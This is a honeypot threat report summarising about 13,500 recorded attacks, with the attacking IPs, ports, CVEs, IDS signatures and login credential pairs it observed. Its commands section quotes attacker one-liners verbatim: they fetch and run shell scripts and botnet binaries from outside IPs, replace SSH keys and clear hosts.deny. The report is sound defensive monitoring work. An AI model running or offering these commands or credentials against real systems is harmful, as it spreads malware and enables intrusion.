Honeypot Attack Summary Report

Report Generation Time: 2025-09-29T15:42:23Z
Timeframe: 2025-09-29T15:15:51Z to 2025-09-29T15:40:48Z
Files Used: agg_log_20250929T151551Z.json, agg_log_20250929T152106Z.json, agg_log_20250929T154048Z.json

Executive Summary:
This report summarizes 13,508 attacks recorded by the honeypot network. The majority of attacks were network scans and exploitation attempts. The most active honeypots were Suricata and Cowrie. The most frequent attacker IP was 121.52.153.77. The most targeted port was TCP/445. Several CVEs were targeted, with CVE-2021-44228 being the most common. A number of shell commands were attempted, indicating attempts to download and execute malicious payloads.

Detailed Analysis:

Attacks by Honeypot:
- Suricata
- Cowrie
- Honeytrap
- Ciscoasa
- Dionaea
- Redishoneypot
- Tanner
- H0neytr4p
- Sentrypeer
- Mailoney
- Adbhoney
- Ipphoney
- ElasticPot
- ConPot
- ssh-rsa
- Dicompot
- Heralding
- Honeyaml

Top Attacking IPs:
- 121.52.153.77
- 209.141.43.77
- 85.209.134.43
- 103.140.249.62
- 185.255.91.28
- 91.237.163.113
- 45.249.245.22
- 185.156.73.166
- 92.63.197.55
- 185.156.73.167
- 92.63.197.59
- 35.185.154.63
- 51.178.24.221
- 197.5.145.150
- 102.88.137.80
- 36.91.166.34
- 113.249.101.146
- 94.41.18.235
- 45.61.187.220
- 175.164.216.64

Top Targeted Ports/Protocols:
- TCP/445
- 22
- 23
- 1433
- 6379
- TCP/1433
- 8333
- 8000
- 10443
- 24000
- 80
- TCP/80
- 443
- TCP/1080
- 3306
- 8181
- 8015
- TCP/22
- 631

Most Common CVEs:
- CVE-2021-44228
- CVE-2002-0013
- CVE-2002-0012
- CVE-2021-3449
- CVE-1999-0517
- CVE-2019-11500
- CVE-2024-3721

Commands Attempted by Attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- Enter new UNIX password: 
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
- cd /data/local/tmp/; busybox wget http://161.97.149.138/w.sh; sh w.sh; curl http://161.97.149.138/c.sh; sh c.sh; wget http://161.97.149.138/wget.sh; sh wget.sh; curl http://161.97.149.138/wget.sh; sh wget.sh; busybox wget http://161.97.149.138/wget.sh; sh wget.sh; busybox curl http://161.97.149.138/wget.sh; sh wget.sh
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ...

Signatures Triggered:
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32
- GPL INFO SOCKS Proxy attempt
- ET INFO CURL User Agent
- ET ATTACK_RESPONSE Possible MS CMD Shell opened on local system
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET INFO curl User-Agent Outbound
- ET HUNTING curl User-Agent to Dotted Quad

Users / Login Attempts:
- 345gs5662d34/345gs5662d34
- root/LeitboGi0ro
- root/3245gs5662d34
- foundry/foundry
- seekcy/Joysuch@Locate2024
- admin/Welcome@123
- root/nPSpP4PBW0
- allinone/allinone
- mysql/aini130.
- ubuntu/asd123456
- test/zhbjETuyMffoL8F
- oguz/oguz
- seekcy/Joysuch@Locate2022
- seekcy/Joysuch@Locate2020
- bkp/bkp123

Files Uploaded/Downloaded:
- wget.sh;
- w.sh;
- c.sh;
- arm.urbotnetisass;
- arm.urbotnetisass
- arm5.urbotnetisass;
- arm5.urbotnetisass
- arm6.urbotnetisass;
- arm6.urbotnetisass
- arm7.urbotnetisass;
- arm7.urbotnetisass
- x86_32.urbotnetisass;
- x86_32.urbotnetisass
- mips.urbotnetisass;
- mips.urbotnetisass
- mipsel.urbotnetisass;
- mipsel.urbotnetisass
- Mozi.m%20dlink.mips%27$

HTTP User-Agents:
- N/A

SSH Clients:
- N/A

SSH Servers:
- N/A

Top Attacker AS Organizations:
- N/A

Key Observations and Anomalies:
- A significant number of commands are related to downloading and executing shell scripts from external sources, indicating attempts to install malware or backdoors.
- The high number of DoublePulsar backdoor installation attempts suggests that many attackers are targeting systems vulnerable to this exploit.
- The variety of credentials used indicates both targeted and brute-force attacks.
- The presence of commands to download and execute `urbotnetisass` files suggests a botnet infection campaign.
